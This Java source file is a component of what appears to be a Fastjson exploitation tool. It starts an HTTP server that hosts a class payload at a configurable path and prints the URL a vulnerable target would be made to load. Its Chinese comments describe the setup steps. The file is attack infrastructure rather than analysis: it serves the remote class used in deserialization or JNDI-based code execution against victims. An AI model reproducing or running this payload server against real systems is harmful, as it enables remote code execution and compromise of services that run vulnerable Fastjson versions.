package com.fastjsontool.exploit.httpServer;

import com.fastjsontool.exploit.Info;
import com.sun.net.httpserver.HttpServer;
import java.net.InetSocketAddress;
import java.util.concurrent.Executors;

public class HTTPServer {
    private static String ClassName= Info.className;
    private static String ipaddr= Info.ipaddr;
    private static int port=Info.httpPort;


    public void start(String Context) throws Exception {
        try {
            //创建一个HttpServer实例，并绑定到指定的IP地址和端口号
            HttpServer httpServer = HttpServer.create(new InetSocketAddress(port), 0);
            //创建一个HttpContext，将路径为/myserver请求映射到MyHttpHandler处理器
            HTTPHandle httpHandle = new HTTPHandle();
            httpHandle.setClassContenxt(Context);
            httpServer.createContext("/"+ClassName,httpHandle);
            //设置服务器的线程池对象
            httpServer.setExecutor(Executors.newFixedThreadPool(10));
            //启动服务器
            System.out.println("开起HTTP服务，地址：http://"+ipaddr+":"+port+"/"+ClassName);
            httpServer.start();
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
